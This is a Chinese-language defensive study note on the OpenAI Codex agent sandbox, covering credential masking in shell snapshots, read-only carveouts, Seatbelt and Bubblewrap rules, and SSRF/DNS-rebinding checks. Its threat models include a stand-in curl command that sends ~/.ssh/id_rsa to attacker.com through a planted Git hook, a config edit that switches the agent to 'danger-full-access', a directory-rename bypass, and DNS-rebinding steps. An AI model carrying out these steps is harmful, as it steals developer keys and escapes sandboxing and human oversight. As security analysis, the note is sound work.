> **一手依据**：[Zsh 启动参数](https://zsh.sourceforge.io/Doc/Release/Invocation.html)、[Zsh 启动文件规则](https://zsh.sourceforge.io/Doc/Release/Files.html)、[Codex 显式加载交互配置的脚本](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/shell-command/src/startup.rs#L9)、[快照捕获的启动模式分支](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/shell-command/src/shell_snapshot_capture.rs#L123)。

---

##### 6.2 Credential Broker 如何做 Shell 快照与“凭证治理”

以下描述 Broker 启用时，受管凭据在 Shell 快照捕获、写盘与重放中的处理路径；不能将其推导为任意配置下的“零机密”保证：

**1. 按执行配置捕获 Shell 环境：**

`run_script_with_timeout` 接收可选的 `ShellSnapshotSandbox` 和凭据 Broker 参数。实际捕获是否使用沙箱、使用什么文件权限，以及网络是否经由代理，应结合传入配置判断，不能仅凭函数名就断言所有探针都在同一种沙箱或代理下执行。显式加载启动脚本也不代表脚本中的所有行为均被禁止；可执行的操作仍取决于生效的权限策略。

**2. 四维完整的快照内容捕获（`CapturedSnapshot`）：**
Codex 在 `shell_snapshot_capture.rs` 中设计了内建探针脚本，不仅捕获环境变量，还固化了无形但关键的内存状态：
- **Functions（函数声明）**：通过 `declare -f`（Bash）或 `functions`（Zsh）捕获函数定义；不能将版本管理器的函数、Shims 与可执行文件概括为同一种实现；
- **Aliases（别名系统）**：通过 `alias -L` 提取别名映射；
- **Setopts / Shopt（Shell 模式）**：固化当前的选项标志（如 `setopt AUTO_CD`）；
- **Exports（导出变量）**：提取最终计算展开的 `PATH` 及环境键值对。

**3. 捕获期脱敏与受管凭据的落盘保护：**
如果将含真实凭据的探针结果直接写盘，用户配置在 `.bashrc`/`.zshrc` 中的私有 Token（如 `export GITHUB_TOKEN="ghp_xxx"`）可能随快照持久化。本次核验的实现使用 `CODEX_HOME/shell_snapshots/` 存放这类快照，默认通常对应 `~/.codex/shell_snapshots/`。
- Broker 启用的相关路径在写入磁盘前处理受管凭据：
  - 调用 `apply_to_env_for_snapshot` 解析识别所有受管机密；
  - 调用 `virtualize_brokered_text` 对抓取到的函数体、别名以及复合文本进行匹配，**将识别并纳入管理的真实凭据替换为 Dummy Token**。
- 该机制针对受管凭据降低明文落盘风险，不能保证最终快照不包含任何未被识别的秘密。不能仅凭存在这些处理函数，就认定所有配置和执行路径下的快照均已完成脱敏。

**4. 运行期加载快照与执行命令：**

在支持快照重放的执行路径中，可以先读取快照恢复环境，再执行目标命令。下面仅用简化命令展示这一原理，**不是 Codex 源码生成命令的逐字还原，也不代表所有执行路径都会这样改写**；路径需替换为实际快照的完整路径：

```bash
zsh -fc '. "/absolute/path/to/.codex/shell_snapshots/example.sh" && git status'
```

- **`-f` 参数（NO_RCS）**：关闭 `RCS`，跳过受该选项控制的启动文件；系统级 `zshenv` 仍会执行，且启动脚本可改变选项。它不是“完全没有初始化”或“固定 1 毫秒启动”的保证。
- **`. snapshot.sh`**：在当前 Shell 中执行快照脚本，恢复已捕获的环境状态。示例使用完整路径，避免将 `~` 放入引号后误以为它仍会展开为用户主目录。
- **执行目标命令**：环境齐备后执行 `git status`。后续若发起受支持的 HTTP 请求，且请求经过 Broker 代理并通过匹配与授权检查，代理才会注入对应的真实凭据。不能据此认定 SSH 方式的 `git push` 或其他未接入该处理路径的协议也获得了同样的凭据隔离。

> **一手源码依据**：[快照目录常量](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/core/src/shell_snapshot.rs#L107)、[探针启动参数、可选 Broker 与沙箱处理](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/core/src/shell_snapshot.rs#L1022)。

**5. 版本联动失效机制（Config Revision Invalidation）：**
快照文件与凭证代理策略深度绑定（记录 `broker_config_revision`）：
```rust
pub(crate) fn is_brokered_for(&self, policy: &ShellEnvironmentPolicy) -> bool {
    self.credentials.as_ref().is_some_and(|credentials| {
        &credentials.shell_environment_policy == policy
            && credentials.broker_config_revision
                == credentials.network_proxy.credential_broker_config_revision()
    })
}
```
一旦用户修改了网络配置、新增了自定义凭据提供者或轮换了密钥，`broker_config_revision` 自动递增。现有的 Shell 快照会被标记为过期并安全清理，促使下一次命令执行时自动在沙箱内重新生成干净合规的新快照。

---

## 🛡️ 5. 文件系统隔离：元数据硬阻断（Carveouts）与防提权逃逸

在编写代码场景中，Agent 必须拥有当前工作区目录的写权限（`WritableRoot`）才能正常创建和修改源码。然而，工作区并非普通纯文本目录，其内部通常包含极其敏感的版本控制与配置元数据（如 `.git`、`.codex`、`.agents`）。如果简单地将整个目录全量开放写入，将引发致命的**宿主机持久化逃逸与时间差提权**。

### 5.1 威胁建模：Git Hook 提权与配置篡改

#### 1. 攻击原理：“沙箱内埋雷，宿主机引爆”
Git 自带的自动化挂钩（如 `.git/hooks/pre-commit`）会在用户执行 `git commit` 时由操作系统静默调用执行。
当不可信的沙箱代码（或第三方恶意依赖包）试图突破隔离时，往往不需要在沙箱内强攻操作系统内核，而是采用**时间差提权与逃逸**：

```mermaid
sequenceDiagram
    autonumber
    participant Sandbox as 沙箱内不可信代码 (受限环境)
    participant Disk as 本地项目磁盘 (.git/hooks/pre-commit)
    participant HostUser as 开发者 (宿主机常规终端 / 完整特权)
    participant Attacker as 远端黑客服务器

    Note over Sandbox,Disk: 1. 沙箱内埋雷 (不可信进程)
    Sandbox->>Disk: 篡改 pre-commit: "curl -d @~/.ssh/id_rsa https://attacker.com/keys"
    Note over Sandbox: 沙箱内断网且受限，脚本暂不触发/无法外联

    Note over HostUser,Disk: 2. 宿主机特权触发 (无沙箱保护)
    HostUser->>HostUser: 在宿主机常规终端敲入 git commit
    HostUser->>Disk: Git 引擎静默调用 pre-commit 钩子
    Disk->>Attacker: 以宿主完整权限执行恶意脚本，外发 SSH 私钥与凭据！
```

在 Codex 源码测试用例（`seatbelt_tests.rs:3026`）中明确记载了这一防御初衷：
> *"For the purposes of this test, we consider this a 'vulnerable' root because a bad actor could write to `.git/hooks/pre-commit` so an unsuspecting user would run code as privileged the next time they ran `git commit` themselves, or modified `.codex/config.toml` to contain `sandbox_mode = "danger-full-access"` so the agent would have full privileges the next time it ran in that repo."*

除了 Git Hook 劫持外，恶意代码若能修改 `.codex/config.toml`，还可诱导 Codex 下一次启动时自动以 `danger-full-access`（无沙箱模式）运行，从而彻底瘫痪防御体系。

---

### 5.2 受保护元数据清单与“只读抠洞（Carveouts）”

为了既支持 Agent 自由编辑工作区代码，又绝不留下提权后门，Codex 提出了**“大权下放，核心抠洞，绝对锁死”**的安全公理：
$$\text{Writable Workspace} = \text{Project Directory} \setminus \text{Protected Metadata}$$

在 `codex-protocol/src/permissions.rs` 中，Codex 定义了不可逾越的受保护元数据清单：
```rust
pub const PROTECTED_METADATA_PATH_NAMES: &[&str] = &[
    ".git",     // 防 Git Hook 提权与仓库配置劫持
    ".agents",  // 防 Agent 自定义工具与执行指令篡改
    ".codex",   // 防篡改 config.toml (如自提权为 danger-full-access)
    ".aws",     // 防云端凭据被植入或窃取
];
```

无论宿主为沙箱授予了多大的工作区写权限（`WritableRoot`），底层引擎都会通过**“只读抠洞（Carveouts）”**机制，将上述关键元数据目录从写权限列表中强制剥离并重定向为只读。

---

### 5.3 跨平台硬阻断工程落地

Codex 并没有停留在应用层软拦截，而是在操作系统内核层（Linux Bubblewrap / macOS Seatbelt）构筑了三层立体防御网。

```mermaid
flowchart TD
    A[沙箱内文件系统写操作] --> B{第一道防线: 宿主应用层预检}
    B -- 命中敏感元数据 --> X[应用层即时抛错: forbidden_agent_metadata_write]
    B -- 绕过或直接底层系统调用 --> C{第二道防线: 内核级沙箱}

    subgraph Linux [Linux: Bubblewrap 命名空间挂载]
        C --> D1[已存在的敏感目录] --> E1["--ro-bind 只读覆盖挂载 (内核报 EROFS)"]
        C --> D2[尚未创建的敏感目录] --> E2["--perms 555 --tmpfs --remount-ro (占位空内存盘，防 mkdir)"]
    end

    subgraph macOS [macOS: Seatbelt / SBPL 内核规则]
        C --> F1[正则反向阻断] --> G1["require-not regex ^root/.git(/.*)?$"]
        C --> F2[防偷梁换柱逃逸] --> G2["deny file-write-unlink 锁死父目录"]
        C --> F3[防底层句柄篡改] --> G3["deny system-fcntl 80 110"]
    end
```

#### 1. Linux（Bubblewrap）双轨挂载治理
在 `linux-sandbox/src/bwrap.rs` 中，Codex 利用 Linux Mount Namespace 实现细粒度只读覆盖：
- **现存敏感目录：`--ro-bind` 覆写**
  工作区根目录通过 `--bind` 暴露给沙箱可写后，引擎紧接着对 `.git`、`.codex` 等子路径追加 `--ro-bind`：
  ```rust
  bwrap_args.args.push("--ro-bind".to_string());
  bwrap_args.args.push(path_to_string(subpath));
  bwrap_args.args.push(path_to_string(subpath));
  ```
  在内核 VFS（虚拟文件系统）层面，`.git` 成为只读挂载点，任何写入均直接触发内核级 `EROFS (Read-only file system)`。
- **未创建敏感目录：`555 tmpfs` 占位防新建**
  若当前项目尚无 `.git` 或 `.codex`，恶意脚本可能会尝试通过 `mkdir .git` 抢先创建。为了封堵这一漏洞，Codex 实现了 `append_empty_directory_args`：
  ```rust
  bwrap_args.args.push("--perms".to_string());
  bwrap_args.args.push("555".to_string());
  bwrap_args.args.push("--tmpfs".to_string());
  bwrap_args.args.push(path_to_string(path));
  bwrap_args.args.push("--remount-ro".to_string());
  bwrap_args.args.push(path_to_string(path));
  ```
  在沙箱启动时，预先在目标路径挂载一个只有只读权限（`555`）的空内存盘（`tmpfs`），并立即重挂为只读（`--remount-ro`）。沙箱内进程既无法创建同名目录，也无法向该路径写入任何文件。

#### 2. macOS（Seatbelt / SBPL）三层立体硬阻断
在 macOS 下，Seatbelt 通过内核策略语言（SBPL）对系统调用逐次鉴权：

##### ① 正则反向排除（Regex Carveout）
在 `sandboxing/src/seatbelt.rs` 的 `build_seatbelt_access_policy` 中，Codex 动态编译排除规则：
```rust
fn seatbelt_protected_metadata_name_regex(root: &AbsolutePathBuf, name: &str) -> String {
    format!(r#"^{root}/{name}(/.*)?$"#)
}
```
展开为 SBPL 规则：
```scheme
(allow file-write*
  (require-all
    (subpath "/Users/alice/project")
    (require-not (regex #"^/Users/alice/project/\.git(/.*)?$"))
    (require-not (regex #"^/Users/alice/project/\.codex(/.*)?$"))
    (require-not (literal (param "DOT_GIT_PATH")))
    (require-not (subpath (param "DOT_GIT_PATH")))
  )
)
```
无论是触碰 `.git` 目录本身还是内部嵌套的任何子文件（`pre-commit`），内核均直接拍死。

##### ② 破解“偷梁换柱”：`deny file-write-unlink` 锁死父目录
单纯依靠路径正则存在致命漏洞：**目录重命名逃逸（Directory Relocation Attack）**。
恶意代码无法直接向 `/project/.git` 写入，但由于它拥有 `/project` 的写权限，它可以执行：
1. `mv /project /project_fake`（将父目录改名）；
2. 内核正则只匹配 `/project/.git`，此时写入 `/project_fake/.git` 不受正则阻断，成功植入木马；
3. `mv /project_fake /project`（将父目录改回原名，神不知鬼不觉）。

为了彻底封死此类攻击，Codex 在 `seatbelt.rs` 中递归追溯所有受保护路径的**祖先目录（Ancestors）**，并剥夺其解绑与删除权：
```rust
for ancestor in protected_path.ancestors().skip(1) {
    if !ancestor.as_path().starts_with(root.as_path()) {
        break;
    }
    protected_ancestors.insert(ancestor);
}
```
在策略最终处注入内核级 `unlink` 禁令：
```scheme
(deny file-write-unlink 
  (require-all (vnode-type DIRECTORY) (literal (param "PROTECTED_ANCESTOR_0"))))
```
- ✅ **允许正常写代码**：开发者与 Agent 仍可在 `/project` 下新建 `src/index.ts`、修改 `README.md`；
- ❌ **绝对禁止为项目目录更名/移位**：任何针对项目根目录及父级链条的 `mv` 或 `rmdir` 操作直接被内核拦截（`Operation not permitted`），将“偷梁换柱”的物理基础彻底焊死。

##### ③ 封堵 macOS 专有句柄后门（`system-fcntl 80 110`）
在 macOS XNU 内核中，存在特定的未公开/底层文件控制命令：
- `F_MAKECOMPRESSED` (80)
- `F_TRANSFEREXTENTS` (110)

这两个指令甚至允许进程通过**只读文件描述符**悄悄修改底层数据块或压缩属性。Codex 在非全盘可写策略中强制注入：
```scheme
(deny system-fcntl (fcntl-command 80 110))
```
切断了通过操作系统专有系统调用逃逸的所有暗道。

#### 3. 宿主应用层防御纵深
在下发系统调用之前，Codex 的 `forbidden_agent_metadata_write` 会作为前置过滤器：
一旦 Agent 的补丁生成（`apply_patch`）或写入工具命中了 `.git`、`.codex`、`.agents`、`.aws`，应用层在向操作系统派发前便直接截断并报错，形成“应用层前置防御 + 操作系统内核层物理锁死”的纵深防御体系。

---

## 🌐 6. 网络安全纵深：SSRF 防御与 DNS 实时探针机制

在智能体（Agent）的执行环境中，不可信代码对网络的滥用不仅限于向外泄露机密，还包括**反向刺探宿主机本地（`127.0.0.1`）以及企业内网环境（`192.168.x.x`）**。为降低此类 SSRF 风险，Codex 在 `network-proxy` 模块中结合 DNS 异步解析与 IP 地址分类检查实施防护；这些检查不能被视为完全消除 DNS 重绑定风险的保证。

### 6.1 概念基准与核心定义

| 术语 / 机制 | 官方全称 | 通俗心智模型 | 核心作用与安全公理 |
| :--- | :--- | :--- | :--- |
| **DNS** | **Domain Name System**（域名系统） | **“互联网的查号台 / 电话本”** | 负责将人类可读的域名（如 `api.github.com`）解析为网络路由所需的真实 IP 地址（如 `140.82.113.6`）。 |
| **SSRF** | **Server-Side Request Forgery**（服务端请求伪造） | **“借刀杀人” / “骗跑腿小哥偷家底”** | 攻击者（沙箱内代码）无法直接触达内网，便通过诱骗具备网络特权的服务端（本地网络代理）代其向内部敏感网络节点发起攻击或数据窃取。 |
| **DNS 实时探针** | **Real-time DNS & IP Probe** | **“出门前当场查户口，动真格前二次复核”** | 代理层在放行出站连接前，主动对目标域名执行异步 DNS 解析并核验解析结果是否落在局域网或保留网段，并在不同协议阶段实施多次重验。 |

---

### 6.2 权责边界澄清：沙箱能访问 `127.0.0.1` 并看到系统所有情况吗？

在探讨防御机制前，必须彻底厘清**操作系统内核沙箱**与**网络代理**的权责边界：

#### 1. 沙箱进程能直接访问 `127.0.0.1` 吗？
- **直接直连：绝对不能**。
  在 macOS 下，Seatbelt 规则在启动时会强制写入：
  ```scheme
  (allow network-outbound (remote ip "localhost:5678"))
  ```
  沙箱内部进程如果直接尝试连接本机 MySQL（`3306`）或 Redis（`6379`），系统调用会被 macOS 内核当场拍死并抛出 `Operation not permitted`。
- **通过网络代理“借刀杀人”：没有探针机制时，可以！**
  因为沙箱进程被明确允许连接代理端口（`127.0.0.1:5678`），若网络代理本身没有实现 SSRF 拦截逻辑，沙箱代码只需向代理发送 `GET http://127.0.0.1:6379`，由于代理运行在无沙箱限制的宿主机主进程中，代理就会代表沙箱去敲开本地 Redis，并将数据传回给沙箱。这就是 **SSRF** 风险所在。

#### 2. 沙箱进程能读取工作区之外的文件，包括 SSH 私钥吗？

**`workspace-write` 默认主要限制文件写入范围，不会把文件读取限制在工作区内。**在本次核验的 Codex 源码版本（提交 `44fe510`，2026-09-28）中，`workspace_write()` 显式授予根目录 `/` 的读取权限；macOS Seatbelt 在无额外读取限制的对应路径中生成 `(allow file-read*)`。这里的根目录读取权限不代表获得 root 用户权限，实际读取仍受宿主用户权限、macOS 隐私授权及额外访问策略约束。

**SSH 私钥不会仅因位于 `~/.ssh` 就自动受到这套默认策略的读取保护。**本次核验的默认策略中未发现针对 `~/.ssh` 的专门读取禁令。因此，在没有额外读取限制、且运行命令的用户拥有读取权限时，沙箱子进程可能读取其中的私钥文件。私钥常用的 `600` 文件权限主要阻止其他用户访问，不能阻止以文件所有者身份运行的子进程读取。私钥若有口令加密，读取文件不等于立即获得可用私钥，但仍可能取得并复制加密的私钥文件。

需要分别核验三个权限边界：
- **文件读取**：哪些路径可以读取；需要隔离私钥等敏感文件时，应设置明确的读取拒绝规则，或使用不包含这些文件的隔离环境。
- **文件写入**：哪些路径可以创建、修改或删除；工作区外不可写，不等于工作区外不可读。
- **网络访问**：哪些目标可以连接；限制网络连接不会自动禁止读取本地文件。

提示词要求 Agent 不读取私钥属于行为约束，不能替代操作系统强制执行的读取限制。进程枚举、屏幕捕获、录音和其他进程内存访问涉及各自的权限机制，仍需分别核验，不从文件或网络策略直接推导结论。

> **一手源码依据**：[默认读写策略 `workspace_write()`](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/protocol/src/permissions.rs#L817)、[macOS Seatbelt 读取策略生成](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/sandboxing/src/seatbelt.rs#L984)。上述结论对应此源码快照，具体会话应以最终生效的权限策略为准。

---

### 6.3 威胁建模：黑客的两套绕过手段

如果代理层仅仅依靠**域名字符串白名单**匹配（如判断 `allowed_domains.contains("github.com")`），攻击者可利用以下两种手法轻松击穿防线：

```mermaid
sequenceDiagram
    autonumber
    participant BadCode as 沙箱内不可信代码
    participant Proxy as 本地网络代理 (codex-network-proxy)
    participant DNS as 公网 DNS 权威服务器
    participant LocalDB as 宿主本地敏感服务 (127.0.0.1)

    Note over BadCode,LocalDB: 场景 A：伪装公网域名的泛解析映射 (nip.io)
    BadCode->>Proxy: 请求 "http://127.0.0.1.nip.io"
    Note over Proxy: 字符串匹配若不深入，误以为是合法外部域名
    Proxy->>LocalDB: 盲目转发 -> 导致 SSRF 击穿！

    Note over BadCode,LocalDB: 场景 B：川剧变脸 (DNS Rebinding 攻击)
    BadCode->>Proxy: 发起 CONNECT 请求目标为 "rebind.attacker.com" (TTL=0)
    Proxy->>DNS: 第 1 次解析 (白名单与初筛判定)
    DNS-->>Proxy: 返回外部合法 IP (8.8.8.8) -> 放行
    Note over Proxy: 建立隧道后，开始解密转发真实 HTTP 请求
    Proxy->>DNS: 第 2 次解析 (实际发包)
    DNS-->>Proxy: 攻击者瞬间切换解析结果，返回 127.0.0.1！
    Proxy->>LocalDB: 请求落到本地回环 -> 敏感内网泄露！
```

1. **公网域名内网映射（Private IP Mapping）**：
   攻击者在公网注册一个域名（如 `safe.attacker.com`），但在 DNS 后台将 A 记录直接指向 `127.0.0.1`；或者直接使用公网的泛解析服务（如 `*.nip.io`）。这就是服务端请求伪造。
2. **DNS 重绑定（DNS Rebinding 攻击）**：
   攻击者控制权威 DNS，将域名的 TTL（存活时间）设为 0。当代理第一次做白名单校验时，DNS 返回合法的公网 IP；而在代理正式发起 TCP 连接或解密出内层 HTTP 流量的毫秒级时差内，DNS 瞬间“变脸”返回 `127.0.0.1`，从而在运行时绕过检查。

---

### 6.4 一手工程落地：Codex 的四重立体探针体系

以下描述本次核验的 `codex-rs/network-proxy` 源码快照（提交 `44fe510`，2026-09-28）中的检查机制。检查是否执行取决于请求路径和生效策略；多次解析检查不等于已在实际连接中固定目标 IP。

#### 1. 异步实时探针（Asynchronous DNS Probe）
**【通俗心智：绝不单凭名字认人，出门前当场“查户口”】**
当沙箱配置了 `allow_local_binding = false` 时，Codex 严禁单纯依赖静态域名字符串检查：
- 不可信代码递过来的域名名字无论叫得再好听（哪怕通过了白名单），代理也绝不盲信放行；
- 代理必须立刻异步向 DNS 查号台发起探针请求（调用 `lookup_host`），实时查出该域名在当前物理网络下解析出的**全部真实物理 IP 地址**。

```rust
// codex-rs/network-proxy/src/runtime.rs:763
} else if host_resolves_to_non_public_ip(
    host_str,
    port,
    DNS_LOOKUP_TIMEOUT,
    |host, port| async move {
        lookup_host((host.as_str(), port))
            .await
            .map(Iterator::collect)
    },
)
.await
{
    return Ok(HostBlockDecision::Blocked(HostBlockReason::NotAllowedLocal));
}
```

#### 2. RFC 全保留网段硬过滤（`is_non_public_ip`）
**【通俗心智：拿查出的物理 IP，逐个核对“全国户籍禁行底册”】**
探针拿到了该域名所有的物理门牌号（IP 地址）后，怎么精准判断它是不是内网？Codex 没有只简单防范常见的 `127.0.0.1` 或 `192.168.x.x`，而是在 `policy.rs` 中通过 Rust 标准库与 CIDR 位运算穷举了所有 RFC 保留的非公网段，构筑了一张不可逾越的“全网禁行底册”：

```rust
// codex-rs/network-proxy/src/policy.rs:62
fn is_non_public_ipv4(ip: Ipv4Addr) -> bool {
    ip.is_loopback()
        || ip.is_private()
        || ip.is_link_local()
        || ip.is_unspecified()
        || ip.is_multicast()
        || ip.is_broadcast()
        || ipv4_in_cidr(ip, [0, 0, 0, 0], 8)     // 本地网络 (RFC 1122)
        || ipv4_in_cidr(ip, [100, 64, 0, 0], 10)  // 运营商级 CGNAT (RFC 6598)
        || ipv4_in_cidr(ip, [192, 0, 0, 0], 24)   // IETF 协议分配 (RFC 6890)
        || ipv4_in_cidr(ip, [192, 0, 2, 0], 24)   // TEST-NET-1 (RFC 5737)
        || ipv4_in_cidr(ip, [198, 18, 0, 0], 15)  // 基准测试保留段 (RFC 2544)
        || ipv4_in_cidr(ip, [198, 51, 100, 0], 24)// TEST-NET-2 (RFC 5737)
        || ipv4_in_cidr(ip, [203, 0, 113, 0], 24) // TEST-NET-3 (RFC 5737)
        || ipv4_in_cidr(ip, [240, 0, 0, 0], 4)    // 保留地址 (RFC 6890)
}
```
- **比对逻辑**：只要探针查出来的 IP 列表中**包含任意一个**属于本机（`127.0.0.1`）、局域网（`192.168.x.x`、`10.x.x.x`、`172.16.x.x`）、运营商级 NAT（CGNAT）或测试保留网段的地址，代理立刻将其判定为 SSRF 风险，就地阻断并返回 `NotAllowedLocal`；
- **IPv6 兜底**：同理，在 `is_non_public_ipv6` 中覆盖了 `::1`、唯一本地地址（Unique-Local `fc00::/7`）与链路本地等，绝不留死角。

#### 3. Fail-Closed（探测失败即阻断）安全公理
**【通俗心智：宁可错杀，绝不放过】**
在给 DNS 查号台打电话查 IP 时，若发生网络抖动、查询超时（超过 `DNS_LOOKUP_TIMEOUT`）或 DNS 报错：
- 很多业余代理会抱着侥幸心理降级放行；
- Codex 坚决执行 **Fail-Closed（默认拒绝）**：你既然连合法的公网 IP 都自证不了，就直接视为可疑分子，一律就地阻断！

```rust
// codex-rs/network-proxy/src/runtime.rs:1145
let addrs = match timeout(lookup_timeout, lookup(host.to_string(), port)).await {
    Ok(Ok(addrs)) => addrs,
    Ok(Err(err)) => {
        debug!("blocking host because DNS lookup failed (host={host}, port={port}): {err}");
        return true; // 报错即阻断！
    }
    Err(_) => {
        debug!("blocking host because DNS lookup timed out (host={host}, port={port})");
        return true; // 超时即阻断！
    }
};
```
$$\text{DNS 探测失败} \implies \text{无法证明目标属于合法公网} \implies \text{执行绝对阻断}$$

#### 4. 双阶段校验与 Host 一致性检查：降低 DNS 重绑定风险

**通俗理解：多检查一次，可以发现部分地址变化，但不能保证连接时地址仍未变化。**

在适用的 CONNECT 隧道与 MITM HTTPS 请求处理路径中，Codex 会在不同阶段检查目标。在 `mitm.rs` 中，源码明确说明二次检查用于防御 CONNECT 与内层 HTTPS 请求之间的 DNS 重绑定：

- **阶段 1（CONNECT 握手）**：按生效策略执行域名授权与本地/私有地址检查；
- **阶段 2（TLS 解密后的 HTTP 请求处理）**：再次调用目标检查逻辑。如果此时被判定为不允许的本地/私有目标，则阻断该请求；
- **报文 Host 强一致校验**：
  ```rust
  if let Some(request_host) = extract_request_host(req) {
      let normalized = normalize_host(&request_host);
      if !normalized.is_empty() && normalized != policy.target_host {
          return Ok(MitmPolicyDecision::Block(text_response(StatusCode::BAD_REQUEST, "host mismatch")));
      }
  }
  ```
  该分支拒绝内层请求主机名与隧道目标主机名不一致的请求，降低目标混淆风险；Host 一致性检查本身不能保证同一域名的 DNS 解析地址保持不变。

**剩余限制：检查通过的 IP 不一定就是实际连接使用的 IP。**如果第二次检查通过后，建立上游连接时再次解析域名，攻击者仍可能让新的解析结果指向内网地址。这属于“检查时”与“使用时”之间的竞态，不能靠“已经检查两次”就认定已消除。

要封闭这类解析与连接之间的竞态，需要在传输层将实际连接绑定到已经验证的 IP 地址，避免重新解析到未经检查的地址。官方文档明确将当前 DNS/IP 检查描述为尽力防护（best effort）：可以降低 DNS 重绑定风险，但不能完全消除。如果威胁模型包含恶意 DNS，还需要结合更底层的出站访问控制。

> **一手依据**：[MITM 请求中的二次检查](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/network-proxy/src/mitm.rs#L388)、[官方 DNS 重绑定防护及其限制](https://learn.chatgpt.com/docs/agent-approvals-security#dns-rebinding-protections)。

---

## 🧭 7. 认知前沿地标（待探索内容）

沙箱体系不仅包含上述网络与文件系统隔离维度，还与网络探针、进程生命周期以及动态提权控制深度交织。以下为后续学习与逆向探索的认知地标：

- [x] **文件系统元数据硬阻断（防 Git Hook 提权）**（已内化至第 5 节）：
  - 核心包含受保护元数据清单（`.git`/`.codex`/`.agents`/`.aws`）、Linux `bwrap` 只读与 555 占位挂载、macOS SBPL 正则阻断与 `deny file-write-unlink` 锁死父目录。
- [x] **SSRF / DNS 实时探针机制**（已内化至第 6 节）：
  - 核心包含非公网地址分类检查、Fail-Closed 异步探针，以及适用 CONNECT/MITM 路径中的双阶段重检；这些机制降低 DNS 重绑定风险，但检查与实际连接之间仍可能存在竞态。
- [x] **Credential Broker 凭据隔离机制**（已内化至第 4 节）：
  - Broker 启用条件与受管凭据范围、形状保持替身、协议探测与延迟 MITM 请求头注入，以及本地连接真实凭据回退例外。
- [x] **沙箱提权与审批机制**（已整理至 [[openai_codex_sandbox_escalation|Codex 沙箱提权与审批机制]]，依据提交 `89461ea`，2026-10-19）：
  - 区分编排器内部 Two-Attempt Loop 与模型重新提出显式权限申请；理解用户和 Guardian 的审批分工，以及获批后无沙箱执行或保留禁止读取规则的文件系统扩权。进程基础机制见 [[openai_codex_sandbox_processes|Codex 进程隔离与权限边界]]，资源限制见 [[openai_codex_sandbox_resources|资源限额专题]]，平台验证见下列待探索项。
- [x] **进程隔离、权限边界与清场的基础机制**（已整理至 [[openai_codex_sandbox_processes|Codex 进程隔离与权限边界]]）：
  - 用测试任务理解进程、进程视野、系统调用过滤、身份权限和子进程清理；区分 Linux 与 macOS 的实现方式，不预设全量回收保证。
- [ ] **进程隔离的平台行为与回收范围（待验证 ❓）**：
  - macOS 下 sudo/setuid 的具体行为，以及不同配置下查看、影响其他进程的边界。
  - 子进程改变分组、父进程异常退出等情况下，实际清理范围与可能留存的进程。
- [x] **资源限额的基本机制**（已整理至 [[openai_codex_sandbox_resources|Codex 沙箱资源限额的基本机制]]，依据提交 `0910087`，2026-10-20）：
  - 理解 CPU、内存和任务数量配额，区分等待输出与执行超时、输出缓冲与程序内存、会话管理数量与进程树成员数量。
- [ ] **运行环境的实际资源配额（待验证 ❓）**：
  - 本地或部署环境是否设置 CPU、内存、任务数量及磁盘配额，由哪层设置，作用范围是什么？

---

## 🔗 体系联动

- [[openai_codex_sandbox_resources|Codex 沙箱资源限额的基本机制]]（资源用量、执行超时、输出缓冲与运行环境配额）
- [[openai_codex_sandbox_processes|Codex 进程隔离与权限边界]]（进程视野、系统调用过滤、身份权限与子进程清场）
- [[openai_codex_sandbox_escalation|Codex 沙箱提权与审批机制]]（权限申请、Guardian 自动审批、两次尝试与新版获批扩权路径）
- [[openai_codex_architecture|OpenAI Codex 全景架构]]（了解沙箱层在 Codex 四层解耦架构中的物理防爆舱定位）
- [[openai_codex_cli|OpenAI Codex CLI 逆向]]（理解命令入口参数解析与影子进程 `codex-linux-sandbox` 的启动关系）
- [[harness_lifecycle|Harness 生命周期与解耦]]（理解通用执行外壳与项目安全策略的动态挂载）
- [[tool_explosion_and_governance|工具爆炸与治理]]（理解工具调用的最小特权原则与边界管控）

